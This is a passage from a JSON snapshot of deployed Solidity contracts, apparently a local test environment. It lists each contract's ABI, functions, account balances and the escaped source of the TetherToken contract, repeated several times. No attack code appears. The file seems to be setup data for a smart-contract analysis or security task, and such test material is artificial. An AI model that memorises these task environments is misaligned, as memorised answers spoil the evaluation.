_totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xA57B8a5584442B467b4689F1144D269d096A3daF",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xA57B8a5584442B467b4689F1144D269d096A3daF": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99747072680000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99747072680000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be 